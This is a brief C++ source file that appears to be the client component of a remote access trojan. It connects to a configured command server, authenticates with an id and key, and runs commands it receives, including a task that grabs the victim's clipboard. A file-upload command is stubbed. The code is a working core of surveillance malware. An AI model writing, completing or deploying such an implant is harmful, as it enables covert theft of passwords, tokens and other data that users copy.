#include "connection/client.h"
#include "config.h"
#include "tasks/get_clipboard.h"

void startClient() {
    client client(config::host, config::port);
    client.connect();
    client.handshake(config::id, config::key, control);
    while (client.isConnected()) {
        string packet = client.receivePacket();
        auto req = request::parse(packet);
        client.sendPacket(response{received, req.task_id }.dump());
        switch (req.cmd) {
            case GetClipboard: {
                task *t = new get_clipboard(req.task_id);
                t->execute();
                break;
            }
            case UploadFile:
                break;
            default:
                break;
        }
    }
}
